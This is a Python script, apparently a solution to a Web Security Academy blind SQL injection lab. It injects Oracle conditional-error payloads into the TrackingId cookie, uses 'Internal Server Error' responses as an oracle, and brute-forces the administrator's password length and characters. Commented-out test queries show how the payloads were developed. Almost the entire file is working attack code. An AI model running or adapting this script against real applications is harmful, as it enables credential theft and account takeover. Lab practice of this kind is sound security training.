'''
GET / HTTP/2
Host: 0aa200d704cad70c815b8ed800400089.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aa200d704cad70c815b8ed800400089.web-security-academy.net/
Connection: keep-alive
Cookie: TrackingId=bT0SLldDxoqE2iTY; session=DXBG8pOJ2EfXxzA1STh3McwfwrVHeGte
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
TE: trailers
'''

import requests
from string import ascii_lowercase, digits

url = 'https://0a4100ce034dba8080fddfd400df00d1.web-security-academy.net/'

headers = {
    'Host':    '0a4100ce034dba8080fddfd400df00d1.web-security-academy.net',
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Referer': 'https://0a4100ce034dba8080fddfd400df00d1.web-security-academy.net/',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'TE': 'trailers'
}

cookies = {
    'TrackingId': 'bT0SLldDxoqE2iTY',
    'session': 'DXBG8pOJ2EfXxzA1STh3McwfwrVHeGte'
}

# cookies['TrackingId'] = "bT0SLldDxoqE2iTY' and (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN 1/0 ELSE 'a' END)='a' --"
# cookies['TrackingId'] = "bT0SLldDxoqE2iTY' and (SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN 1/0 ELSE 'a' END)='a' --"


# res = requests.get(url, headers=headers, cookies=cookies, verify=False)

# if 'Internal Server Error' in res.text:
#     print('SQL Injection Successful')

def get_password_length():
    '''
    Password length is 20
    '''
    for i in range(1, 50):
        cookies['TrackingId'] = f"bT0SLldDxoqE2iTY' ||(SELECT CASE WHEN LENGTH(password)={i} THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
        res = requests.get(url, headers=headers, cookies=cookies)
        if 'Internal Server Error' in res.text:
            print(f'Password length is {i}')
            return i
        
def test_query(query):
    cookies['TrackingId'] = f"bT0SLldDxoqE2iTY' {query}"
    res = requests.get(url, headers=headers, cookies=cookies)
    
    if 'Internal Server Error' in res.text:
        print(f'Error triggered: {query}')
    else:
        print(f'NO Error triggered: {query}')

def get_password():
    password_length = 20 # get_password_length()
    password = ''
    for i in range(1, password_length+1):
        for char in ascii_lowercase + digits:
            cookies['TrackingId'] = f"bT0SLldDxoqE2iTY' ||(SELECT CASE WHEN SUBSTR(password,{i},1)='{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
            res = requests.get(url, headers=headers, cookies=cookies)
            if 'Internal Server Error' in res.text:
                password += char
                print(f'Password: {password}')
                break
    print(f'Password: {password}')


# test_query("and (SELECT CASE WHEN (username='administrator' and SUBSTRING(password, 1, 1) = 'A') THEN 1/0=1 ELSE 'a' END)='a' --")

# test_query("||(SELECT '')||'")
# test_query("||(SELECT '' FROM dual)||'")
# SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
# test_query("|| (SELECT CASE WHEN (username='administrator' and SUBSTR(password, 1, 1) = 'B') THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) || '")
# test_query("||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'")
# test_query("||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'")
# test_query("||(SELECT CASE WHEN LENGTH(password)>50 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'")

get_password()